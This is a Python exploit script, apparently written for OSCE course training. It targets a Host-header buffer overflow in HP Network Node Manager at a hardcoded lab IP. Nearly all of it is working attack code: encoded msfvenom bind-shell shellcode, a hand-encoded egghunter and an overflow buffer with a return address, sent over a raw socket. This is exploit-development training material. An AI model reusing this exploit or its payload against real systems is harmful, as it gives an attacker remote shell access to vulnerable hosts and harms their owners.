#!/usr/bin/python

#
# This python script is to be used for HP NNM Exploitation
# I created it during Module 0x08 of OSCE
# It is designed for a target with a Host Header buffer overflow vulnerability
#
import socket
import os
import sys

ip="192.168.100.187"
port=int(7510)
url="/topology/home"

# msfvenom -p windows/shell_bind_tcp LPORT=19397 -e x86/shikata_ga_nai -f py EXITFUNC=seh

pay3 =  "T00WT00W"
pay3 += "\xbf\x36\xed\x1a\xfa\xdb\xce\xd9\x74\x24\xf4\x58\x29"
pay3 += "\xc9\xb1\x53\x31\x78\x12\x03\x78\x12\x83\xf6\xe9\xf8"
pay3 += "\x0f\x0a\x19\x7e\xef\xf2\xda\x1f\x79\x17\xeb\x1f\x1d"
pay3 += "\x5c\x5c\x90\x55\x30\x51\x5b\x3b\xa0\xe2\x29\x94\xc7"
pay3 += "\x43\x87\xc2\xe6\x54\xb4\x37\x69\xd7\xc7\x6b\x49\xe6"
pay3 += "\x07\x7e\x88\x2f\x75\x73\xd8\xf8\xf1\x26\xcc\x8d\x4c"
pay3 += "\xfb\x67\xdd\x41\x7b\x94\x96\x60\xaa\x0b\xac\x3a\x6c"
pay3 += "\xaa\x61\x37\x25\xb4\x66\x72\xff\x4f\x5c\x08\xfe\x99"
pay3 += "\xac\xf1\xad\xe4\x00\x00\xaf\x21\xa6\xfb\xda\x5b\xd4"
pay3 += "\x86\xdc\x98\xa6\x5c\x68\x3a\x00\x16\xca\xe6\xb0\xfb"
pay3 += "\x8d\x6d\xbe\xb0\xda\x29\xa3\x47\x0e\x42\xdf\xcc\xb1"
pay3 += "\x84\x69\x96\x95\x00\x31\x4c\xb7\x11\x9f\x23\xc8\x41"
pay3 += "\x40\x9b\x6c\x0a\x6d\xc8\x1c\x51\xfa\x3d\x2d\x69\xfa"
pay3 += "\x29\x26\x1a\xc8\xf6\x9c\xb4\x60\x7e\x3b\x43\x86\x55"
pay3 += "\xfb\xdb\x79\x56\xfc\xf2\xbd\x02\xac\x6c\x17\x2b\x27"
pay3 += "\x6c\x98\xfe\xd2\x64\x3f\x51\xc1\x89\xff\x01\x45\x21"
pay3 += "\x68\x48\x4a\x1e\x88\x73\x80\x37\x21\x8e\x2b\x7c\x77"
pay3 += "\x07\xcd\xe8\x67\x4e\x45\x84\x45\xb5\x5e\x33\xb5\x9f"
pay3 += "\xf6\xd3\xfe\xc9\xc1\xdc\xfe\xdf\x65\x4a\x75\x0c\xb2"
pay3 += "\x6b\x8a\x19\x92\xfc\x1d\xd7\x73\x4f\xbf\xe8\x59\x27"
pay3 += "\x5c\x7a\x06\xb7\x2b\x67\x91\xe0\x7c\x59\xe8\x64\x91"
pay3 += "\xc0\x42\x9a\x68\x94\xad\x1e\xb7\x65\x33\x9f\x3a\xd1"
pay3 += "\x17\x8f\x82\xda\x13\xfb\x5a\x8d\xcd\x55\x1d\x67\xbc"
pay3 += "\x0f\xf7\xd4\x16\xc7\x8e\x16\xa9\x91\x8e\x72\x5f\x7d"
pay3 += "\x3e\x2b\x26\x82\x8f\xbb\xae\xfb\xed\x5b\x50\xd6\xb5"
pay3 += "\x62\xa0\xea\x23\xf2\x1b\x9f\x09\x9e\x9b\x4a\x4d\xa7"
pay3 += "\x1f\x7e\x2e\x5c\x3f\x0b\x2b\x18\x87\xe0\x41\x31\x62"
pay3 += "\x06\xf5\x32\xa7"

# Manually encoded 4 bytes at a time, after saving an relative ESP 1035FF84

egghunter="\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x23\x54\x58\x2D\x7F\x4D\x55\x55\x2D\x7C\x44\x55\x55\x2D\x7F\x50\x54\x55\x50\x5C\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x23\x2D\x21\x55\x55\x55\x2D\x21\x54\x55\x55\x2D\x49\x6F\x55\x6D\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x30\x44\x03\x30\x2D\x10\x44\x01\x10\x2D\x11\x02\x11\x10\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x60\x60\x50\x03\x2D\x60\x24\x10\x01\x2D\x10\x24\x14\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x07\x23\x50\x65\x2D\x07\x23\x50\x65\x2D\x03\x01\x0B\x05\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x60\x60\x60\x50\x2D\x32\x59\x20\x21\x2D\x32\x41\x25\x1A\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x75\x55\x11\x55\x2D\x75\x26\x11\x55\x2D\x14\x2C\x10\x27\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x39\x32\x32\x32\x2D\x39\x32\x32\x32\x2D\x7F\x59\x49\x31\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x6e\x4F\x12\x7F\x2D\x1b\x1E\x12\x70\x2D\x11\x11\x11\x11\x50"

crash = "A"*3377 + "\x4c\x4c\x77\x21\x2B\x46\x35\x6d" + "A"*29 + egghunter + "C" * (605 - len(egghunter))

buffer="GET " + url + " HTTP/1.1\r\n"
buffer+="Host: " + crash + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: User-Agent: Mozilla/4.0 (Windows NT 10.0) Java/1.6.0_03" + pay3 + "\r\n"
buffer+="Content-Length: 1001024\r\n\r\n"
buffer+=pay3
#
# I actually had "sending even buffer"
#
print "[-] Here we going, sending evil buffer!\n\n"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(buffer)
expl.close

# Spoiler, if you want to watch in WireShark, filter by tcp.port not protocol
# Ask me how I know 

print "[-] Exploit and payload sent successfully!"

exit()
